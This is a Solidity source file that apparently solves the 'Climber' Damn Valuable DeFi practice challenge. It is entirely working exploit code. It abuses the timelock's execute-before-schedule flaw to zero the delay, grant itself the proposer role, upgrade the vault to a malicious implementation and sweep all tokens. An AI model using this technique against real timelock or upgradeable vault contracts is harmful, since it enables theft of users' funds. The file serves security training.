// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "./ClimberVault.sol";
import "../DamnValuableToken.sol";

contract ClimberExploiter {
    ClimberTimelock private immutable timelock;
    DamnValuableToken private immutable token;
    ClimberVault private immutable vault;
    VaultExploitable private immutable vaultExploitable;

    constructor(address payable _timelock, address _vault, address _token) {
        timelock = ClimberTimelock(_timelock);
        token = DamnValuableToken(_token);
        vault = ClimberVault(_vault);
        vaultExploitable = new VaultExploitable();
    }

    function exploit() public {
        bytes memory updateDelayData = abi.encodeCall(
            ClimberTimelock.updateDelay,
            (0)
        );
        bytes memory grantRoleData = abi.encodeCall(
            AccessControl.grantRole,
            (PROPOSER_ROLE,
            address(this))
        );
        bytes memory callbackData = abi.encodeCall(
            this.exploitCallback, ()
        );
        bytes memory upgradeData = abi.encodeWithSignature(
            "upgradeTo(address)",
            address(vaultExploitable)
        );
        bytes memory setSweeperData = abi.encodeCall(
            VaultExploitable.setSweeper,
            (address(this))
        );
        bytes[] memory dataElements = new bytes[](5);
        dataElements[0] = updateDelayData;
        dataElements[1] = grantRoleData;
        dataElements[2] = callbackData;
        dataElements[3] = upgradeData;
        dataElements[4] = setSweeperData;
        address[] memory targets = new address[](5);
        targets[0] = targets[1] = address(timelock);
        targets[2] = address(this);
        targets[3] = targets[4] = address(vault);
        uint256[] memory values = new uint256[](5);
        bytes32 salt = bytes32("");
        timelock.execute(targets, values, dataElements, salt);
        require(vault.getSweeper() == address(this));
        vault.sweepFunds(address(token));
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    function exploitCallback() external {
        bytes[] memory dataElements = new bytes[](5);
        dataElements[0] = abi.encodeCall(
            ClimberTimelock.updateDelay,
            (0)
        );
        dataElements[1] = abi.encodeCall(
            AccessControl.grantRole,
            (PROPOSER_ROLE,
            address(this))
        );
        dataElements[2] = abi.encodeCall(
            this.exploitCallback, ()
        );
        dataElements[3] = abi.encodeWithSignature(
            "upgradeTo(address)",
            address(vaultExploitable)
        );
        dataElements[4] = abi.encodeCall(
            VaultExploitable.setSweeper,
            (address(this))
        );
        address[] memory targets = new address[](5);
        targets[0] = targets[1] = address(timelock);
        targets[2] = address(this);
        targets[3] = targets[4] = address(vault);
        uint256[] memory values = new uint256[](5);
        bytes32 salt = bytes32("");
        timelock.schedule(targets, values, dataElements, salt);
    }
}

contract VaultExploitable is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    modifier onlySweeper() {
        if (msg.sender != _sweeper) {
            revert CallerNotSweeper();
        }
        _;
    }

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function initialize(address admin, address proposer, address sweeper) external initializer {
        // Initialize inheritance chain
        __Ownable_init();
        __UUPSUpgradeable_init();

        // Deploy timelock and transfer ownership to it
        transferOwnership(address(new ClimberTimelock(admin, proposer)));

        _setSweeper(sweeper);
        _updateLastWithdrawalTimestamp(block.timestamp);
    }

    // Allows the owner to send a limited amount of tokens to a recipient every now and then
    function withdraw(address token, address recipient, uint256 amount) external onlyOwner {
        if (amount > WITHDRAWAL_LIMIT) {
            revert InvalidWithdrawalAmount();
        }

        if (block.timestamp <= _lastWithdrawalTimestamp + WAITING_PERIOD) {
            revert InvalidWithdrawalTime();
        }

        _updateLastWithdrawalTimestamp(block.timestamp);

        SafeTransferLib.safeTransfer(token, recipient, amount);
    }

    // Allows trusted sweeper account to retrieve any tokens
    function sweepFunds(address token) external onlySweeper {
        SafeTransferLib.safeTransfer(token, _sweeper, IERC20(token).balanceOf(address(this)));
    }

    function getSweeper() external view returns (address) {
        return _sweeper;
    }

    function setSweeper(address sweeper) external onlyOwner {
        _setSweeper(sweeper);
    }

    function _setSweeper(address newSweeper) private {
        _sweeper = newSweeper;
    }

    function getLastWithdrawalTimestamp() external view returns (uint256) {
        return _lastWithdrawalTimestamp;
    }

    function _updateLastWithdrawalTimestamp(uint256 timestamp) private {
        _lastWithdrawalTimestamp = timestamp;
    }

    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}
